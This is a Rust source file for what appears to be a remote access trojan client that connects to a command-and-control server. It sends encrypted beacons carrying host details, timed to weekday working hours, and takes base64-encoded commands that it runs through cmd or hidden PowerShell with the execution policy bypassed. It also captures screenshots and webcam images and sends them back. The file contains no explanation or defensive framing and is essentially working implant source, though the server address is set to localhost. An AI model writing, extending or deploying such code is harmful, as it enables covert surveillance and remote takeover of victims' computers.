use std::net::{SocketAddr, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::process::Output;
use std::net::IpAddr;
use std::io::{Read, Write};
use std::process::Command;
use std::sync::{LazyLock, Arc, Mutex};
use std::fs::File;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use std::thread;
use std::error::Error;
use aes_gcm::aead::Aead;
use base64::engine::general_purpose;
use base64::Engine;
use ::image::EncodableLayout;
use sha2::digest::generic_array::GenericArray;
use sysinfo::System;
use rand::{Rng, RngCore};
use screenshots::{Screen, image};
use chrono::Local;
use sha2::{Sha256, Digest, Sha512};
use pbkdf2::pbkdf2_hmac;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use opencv::{core, imgcodecs, prelude::*, videoio};

// Constants
const CVER: &str = "0.2.0";
const TYPE: &str = "rust";
const CHUNK_SIZE: usize = 1024;
const LOGGING: bool = true; // Set this to true or false as needed
const SERVER_ADDRESS: &str = "127.0.0.1";
const SERVER_PORT: u16 = 54678;
const MAX_RETRIES: u32 = 5;
const RETRY_INTERVALS: [u64; 6] = [
    10_000,   // 10 seconds
    30_000,   // 30 seconds
    60_000,   // 1 minute
    120_000,  // 2 minutes
    240_000,  // 4 minutes
    360_000   // 6 minutes
];
const BEACON_MIN_INTERVAL: u64 = 5 * 60 * 1000; // 5 minutes
const BEACON_MAX_INTERVAL: u64 = 45 * 60 * 1000; // 45 minutes
const SESSION_ID_LENGTH: usize = 32;

// Global variables (using Arc<Mutex<>> for shared mutable state)
static CLIENT: LazyLock<Arc<Mutex<Option<TcpStream>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));
static LOG_STREAM: LazyLock<Arc<Mutex<Option<File>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));
static START_TIME: LazyLock<SystemTime> = LazyLock::new(SystemTime::now);
static EXIT_PROCESS: AtomicBool = AtomicBool::new(false);
static SESSION_ID: LazyLock<Arc<Mutex<Option<String>>>> = LazyLock::new(|| Arc::new(Mutex::new(None)));

fn log_it(message: &str) {
    if LOGGING {
        if let Some(file) = LOG_STREAM.lock().unwrap().as_mut() {
            let timestamp: u64 = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs();
            writeln!(file, "[{}] {}", timestamp, message).unwrap();
        }
    }
}

fn get_session_id(ip_address: SocketAddr) -> Result<String, Box<dyn Error>> {
    // Extract the IP address without the port
    let ip: IpAddr = ip_address.ip();
    
    // Handle IPv6 localhost
    let ip_copy: IpAddr = if ip == IpAddr::V6(std::net::Ipv6Addr::LOCALHOST) {
        IpAddr::V4(std::net::Ipv4Addr::LOCALHOST)
    } else {
        ip
    };

    // Calculate sum for IPv4, or use 0 for IPv6
    let sum: u32 = match ip_copy {
        IpAddr::V4(ipv4) => ipv4.octets().iter().map(|&x| x as u32).sum(),
        IpAddr::V6(_) => 0,  // We don't sum IPv6 addresses
    };

    // Prepare hash input
    let hash_input = format!("{}<>{}", ip_copy, sum);

    // Compute SHA256 hash
    let mut hasher = Sha256::new();
    hasher.update(hash_input.as_bytes());
    let hash = hasher.finalize();

    // Convert hash to hex and truncate to SESSION_ID_LENGTH characters
    let session_id: String = hex::encode(&hash[..SESSION_ID_LENGTH / 2]);

    log_it(&format!("Session ID: {}", session_id));
    Ok(session_id)
}

fn encrypt_data(data: &str, shared_key: &str) -> Result<String, Box<dyn Error>> {
    let mut salt: [u8; 32] = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut salt);
    
    let mut key: [u8; 32] = [0u8; 32];
    pbkdf2_hmac::<Sha512>(shared_key.as_bytes(), &salt, 200_000, &mut key);
    
    let mut iv: [u8; 12] = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut iv);
    
    let key = GenericArray::from_slice(&key);
    let nonce = Nonce::from_slice(&iv);
    
    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher.encrypt(nonce, data.as_bytes())
        .map_err(|e| format!("Encryption failed: {:?}", e))?;
    
    let salt_b64: String = general_purpose::STANDARD.encode(salt);
    let iv_b64: String = general_purpose::STANDARD.encode(iv);
    let ciphertext_b64: String = general_purpose::STANDARD.encode(ciphertext);
    
    Ok(format!("{}:{}:{}", salt_b64, iv_b64, ciphertext_b64))
}

fn decrypt_data(encrypted: &str, shared_key: &str) -> Result<String, Box<dyn Error>> {
    let parts: Vec<&str> = encrypted.split(':').collect();
    if parts.len() != 3 {
        return Err("Invalid encrypted data format".into());
    }
    
    let salt: Vec<u8> = general_purpose::STANDARD
        .decode(parts[0])
        .unwrap();
    let iv: Vec<u8> = general_purpose::STANDARD
        .decode(parts[1])
        .unwrap();
    let ciphertext: Vec<u8> = general_purpose::STANDARD
        .decode(parts[2])
        .unwrap();
    
    let mut key: [u8; 32] = [0u8; 32];
    pbkdf2_hmac::<Sha512>(shared_key.as_bytes(), &salt, 200_000, &mut key);
    
    let key = GenericArray::from_slice(&key);
    let nonce = Nonce::from_slice(&iv);
    
    let cipher = Aes256Gcm::new(key);
    let plaintext: Vec<u8> = cipher.decrypt(nonce, ciphertext.as_ref())
        .map_err(|e| format!("Decryption failed: {:?}", e))?;
    
    Ok(String::from_utf8(plaintext)?)
}

fn get_retry_interval(retries: usize) -> u64 {
    RETRY_INTERVALS.get(retries).cloned().unwrap_or(0)
}

fn beacon_interval_thread() {
    let mut rng = rand::thread_rng();

    while !EXIT_PROCESS.load(Ordering::Relaxed) {
        let sleep_duration = rng.gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
        thread::sleep(Duration::from_millis(sleep_duration));

        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap();
        let seconds = now.as_secs();
        let (hours, minutes, seconds) = (seconds / 3600 % 24, (seconds / 60) % 60, seconds % 60);
        let day_of_week = (seconds / 86400 + 4) % 7; // 0 is Thursday

        // Check if it's Monday through Friday (1-5) and between 7 AM and 7 PM
        if day_of_week >= 1 && day_of_week <= 5 && hours >= 7 && hours <= 19 {
            let _ = send_beacon();
        }
    }
}

fn start_beacon_interval() -> thread::JoinHandle<()> {
    // Send the first beacon
    let _ = send_beacon();

    // Create and start the thread
    thread::spawn(beacon_interval_thread)
}

fn send_command(response: serde_json::Value) -> Result<(), Box<dyn Error>> {
    let session_id: String = SESSION_ID.lock().unwrap().clone().ok_or("Session ID not set")?;
    let encrypted: String = encrypt_data(&serde_json::to_string(&response)?, &session_id)?;
    
    if encrypted.len() >= CHUNK_SIZE {
        let mut remaining: String = encrypted;
        while !remaining.is_empty() {
            let (chunk, rest) = remaining.split_at(std::cmp::min(CHUNK_SIZE, remaining.len()));
            let mut chunk: String = chunk.to_string();
            if rest.is_empty() {
                chunk += "--FIN--";
            }
            log_it(&format!("Sent Chunk: {}", chunk));
            CLIENT.lock().unwrap().as_mut().ok_or("Client not connected")?.write_all(chunk.as_bytes())?;
            remaining = rest.to_string();
        }
    } else {
        log_it(&format!("Sent Data: {}", encrypted));
        CLIENT.lock().unwrap().as_mut().ok_or("Client not connected")?.write_all(encrypted.as_bytes())?;
    }
    
    Ok(())
}

fn send_beacon() -> Result<(), Box<dyn Error>> {
    send_command(serde_json::json!({
        "response": {
            "beacon": true,
            "version": CVER,
            "type": TYPE,
            "platform": std::env::consts::OS,
            "arch": std::env::consts::ARCH,
            "osver": System::os_version().unwrap_or_default(),
            "hostname": System::host_name().unwrap_or_default()
        }
    }))?;

    Ok(())
}

fn utf8_to_16(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}

fn format_file_name(name: &str, extension: &str) -> String {
    let now: chrono::DateTime<Local> = chrono::Local::now();
    format!("{}_{}_{}.{}", 
        name,
        now.format("%Y-%m-%d"),
        now.format("%H-%M-%S"),
        extension.trim_start_matches('.')
    )
}

fn run_webcam_clip() -> Result<(), Box<dyn Error>> {
    // Set the file name for saving the image
    let file_name: String = format_file_name("wc", "jpg");

    // Open the default camera (index 0)
    let mut camera = videoio::VideoCapture::new(0, videoio::CAP_ANY)?;

    // Check if the camera opened successfully
    if !camera.is_opened()? {
        return Err("Failed to open camera".into());
    }

    // Capture a single frame
    let mut frame = Mat::default();
    camera.read(&mut frame)?;

    // Check if the frame is empty
    if frame.empty() {
        return Err("Failed to capture frame".into());
    }

    // Encode the frame as JPEG
    let mut opencv_buf: core::Vector<u8> = core::Vector::new();
    imgcodecs::imencode(".jpg", &frame, &mut opencv_buf, &core::Vector::new())?;

    // Convert the image buffer to base64
    let encoded_image: String = general_purpose::STANDARD.encode(&opencv_buf);

    // Send the command (assuming send_command is defined elsewhere)
    send_command(serde_json::json!({
        "response": {
            "download": file_name,
            "data": encoded_image
        }
    }))?;

    Ok(())
}

fn run_screenshot() -> Result<(), Box<dyn Error>> {
    let file_name: String = format_file_name("ss", "jpg");
    
    let screen: Screen = screenshots::Screen::all()?[0];
    let buffer: image::ImageBuffer<image::Rgba<u8>, Vec<u8>> = screen.capture()?;

    send_command(serde_json::json!({
        "response": {
            "download": file_name,
            "data": general_purpose::STANDARD.encode(buffer.as_bytes())
        }
    }))?;

    Ok(())
}

fn run_command(command: &str, payload: &str, is_file: bool) -> Result<String, Box<dyn Error>> {
    let command: &str = command.trim();
    if command.is_empty() {
        return Err("No command provided.".into());
    }
    if !["cmd", "ps"].contains(&command) {
        return Err("Unsupported command.".into());
    }

    let mut cmd: Command = Command::new(if command == "cmd" { "cmd.exe" } else { "powershell.exe" });

    match command {
        "cmd" => {
            if payload.contains(';') || payload.contains('&') {
                return Err("Invalid characters in payload.".into());
            }
            cmd.args(&["/c", payload]);
        },
        "ps" => {
            cmd.args(&[
                "-NonInteractive",
                "-NoLogo",
                "-NoProfile",
                "-WindowStyle", "Hidden",
                "-ExecutionPolicy", "Bypass"
            ]);
            if is_file {
                cmd.arg("-File").arg(payload);
            } else {
                let encoded_cmd: String = general_purpose::STANDARD.encode(&utf8_to_16(payload).as_bytes());
                cmd.args(&["-EncodedCommand", &encoded_cmd]);
            }
        },
        _ => unreachable!(),
    }

    let output: Output = cmd.output()?;
    if !output.status.success() {
        return Err(format!("Command failed with code {}. Error output: {}", 
                           output.status.code().unwrap_or(-1), 
                           String::from_utf8_lossy(&output.stderr)).into());
    }

    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

fn format_time(milliseconds: u64) -> String {
    let total_seconds: u64 = milliseconds / 1000;
    let days: u64 = total_seconds / 86400;
    let hours: u64 = (total_seconds % 86400) / 3600;
    let minutes: u64 = (total_seconds % 3600) / 60;
    let seconds: u64 = total_seconds % 60;
    format!("{}d {}h {}m {}s", days, hours, minutes, seconds)
}

fn get_uptime() -> Result<(), Box<dyn Error>> {
    let start: SystemTime = *START_TIME;
    let uptime: Duration = SystemTime::now().duration_since(start)?;
    let formatted_uptime: String = format_time(uptime.as_millis() as u64);
    
    send_command(serde_json::json!({"response":{"data": formatted_uptime}}))?;

    Ok(())
}

fn parse_action(action: &str) -> Result<(), Box<dyn Error>> {
    let parts: Vec<&str> = action.trim().split_whitespace().collect();
    if parts.is_empty() {
        return Err("No action provided".into());
    }

    let command: &str = parts[0];
    let properties: &[&str] = &parts[1..];

    match command {
        "ps" | "cmd" => {
            if properties.is_empty() {
                return Err("No payload provided".into());
            }
            let payload: String = String::from_utf8(general_purpose::STANDARD.decode(properties[0])?)?;
            let result: String = run_command(command, &payload, false)?;
            send_command(serde_json::json!({"response": {"data": result}}))?;
        },
        "up" => {
            get_uptime()?;
        },
        "di" => {
            EXIT_PROCESS.store(true, Ordering::Relaxed);
            std::process::exit(0);
        },
        "ss" => {
            run_screenshot()?;
        },
        "wc" => {
            run_webcam_clip()?;
        },
        _ => return Err(format!("Unknown command: {}", command).into()),
    }

    Ok(())
}

fn connect_to_server() -> Result<(), Box<dyn Error>> {
    let mut retry_count: u32 = 0;

    loop {
        match TcpStream::connect((SERVER_ADDRESS, SERVER_PORT)) {
            Ok(mut stream) => {
                log_it("Client connected");
                *CLIENT.lock().unwrap() = Some(stream.try_clone()?);

                let peer_addr: SocketAddr = stream.peer_addr().unwrap();
                let session_id: String = get_session_id(peer_addr)?;
                *SESSION_ID.lock().unwrap() = Some(session_id);

                loop {
                    let beacon_thread = start_beacon_interval();

                    // Wait for the beacon thread to finish
                    beacon_thread.join().unwrap();

                    let mut buffer = [0; 1024];
                    match stream.read(&mut buffer) {
                        Ok(0) => {
                            log_it("Connection closed by server");
                            break;
                        }
                        Ok(n) => {
                            let data = String::from_utf8_lossy(&buffer[..n]);
                            log_it(&format!("Received data: {}", data));
                            let session_id: String = SESSION_ID.lock().unwrap().clone().unwrap();
                            let decrypted: String = decrypt_data(&data, &session_id)?;
                            parse_action(&decrypted)?;
                        }
                        Err(e) => {
                            log_it(&format!("Error reading from socket: {}", e));
                            break;
                        }
                    }
                }

                if EXIT_PROCESS.load(Ordering::Relaxed) {
                    return Ok(());
                }
            }
            Err(e) => {
                log_it(&format!("Failed to connect: {}", e));
                if retry_count >= MAX_RETRIES {
                    log_it("Max retries reached. Exiting.");
                    thread::sleep(Duration::from_millis(BEACON_MAX_INTERVAL * 8));
                    return Ok(());
                }
                let retry_interval: u64 = get_retry_interval(retry_count as usize);
                log_it(&format!("Retrying in {} seconds...", retry_interval / 1000));
                thread::sleep(Duration::from_millis(retry_interval));
                retry_count += 1;
            }
        }
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    *LOG_STREAM.lock().unwrap() = Some(File::options().append(true).create(true).open("client.log")?);
    
    connect_to_server()?;

    // Clean up
    *LOG_STREAM.lock().unwrap() = None;

    Ok(())
}